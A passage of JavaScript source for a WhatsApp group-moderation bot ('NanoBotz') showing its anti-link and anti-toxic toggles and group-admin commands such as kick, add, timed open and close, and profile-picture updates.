                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkInstagram) return replynano('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replynano('Success in turning on instagram antilink in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replynano('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replynano('Success in turning off instagram antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkFacebook) return replynano('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replynano('Success in turning on facebook antilink in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replynano('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replynano('Success in turning off facebook antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTelegram) return replynano('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replynano('Success in turning on telegram antilink in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replynano('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replynano('Success in turning off telegram antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTiktok) return replynano('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replynano('Success in turning on tiktok antilink in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replynano('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replynano('Success in turning off tiktok antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return replynano('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replynano('Success in turning on twitter antilink in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replynano('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replynano('Success in turning off twitter antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return replynano('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replynano('Success in turning on all antilink in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replynano('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replynano('Success in turning off all antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antitoxic': case 'antibadword': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (antiToxic) return replynano('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replynano('Success in turning on antitoxic in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replynano('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replynano('Success in turning off antitoxic in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (antiWame) return replynano('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replynano('Success in turning on antiwame in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replynano('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replynano('Success in turning off antiwame in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antilink':
case 'antilinkgc': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (Antilinkgc) return replynano('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replynano('Success in turning on antiwame in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replynano('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replynano('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
       
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break

   case 'leavegc': {
if (!DanzTheCreator) return reply(mess.only.owner)
await NanoBotz.groupLeave(m.chat)
await replynano(`Done`)
            }
            break
            
case 'add': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!DanzTheCreator) return reply(mess.only.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'add')
await replynano(`Done`)
}
break

case 'closetime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replynano('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replynano(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
NanoBotz.groupSettingUpdate(from, 'announcement')
replynano(close)
}, timer)
}
break
        
    case 'delete': case 'del': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!m.quoted) throw false
let { chat, id } = m.quoted
 NanoBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break

    case '>l': {
if (!m.quoted) throw false
let { chat, id } = m.quoted
 NanoBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break

            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let response = await NanoBotz.groupInviteCode(m.chat)
NanoBotz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break

case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replynano('The message was not sent by a bot!')
                 NanoBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break


case 'opentime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replynano('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replynano(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
NanoBotz.groupSettingUpdate(from, 'not_announcement')
replynano(open)
}, timer)
}
break

case 'kick': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'remove')
await replynano(`Done`)
}
break

//=========================================\\
case 'kickall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
const users = participants.map(a => a.id)
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'remove')
await replynano(`Done`)
}
break

    case 'setgroupname': case 'setsubject': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replynano('Text ?')
await NanoBotz.groupUpdateSubject(m.chat, text)
await replynano(`Done`)
            }

    break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replynano('Text ?')
await NanoBotz.groupUpdateDescription(m.chat, text)
await replynano(`Done`)
            }
            break
//=========================================\\
case 'getpp':{
if (!m.isGroup) return reply ("Digunakan Khsus Dalam Group")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await NanoBotz.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
NanoBotz.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break 
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!quoted) return replynano(`Where is the picture?`)
if (!/image/.test(mime)) return replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var mediz = await NanoBotz.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await NanoBotz.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replynano(`Success`)
} else {
var memeg = await NanoBotz.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replynano(`Success`)
}
}
break

case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
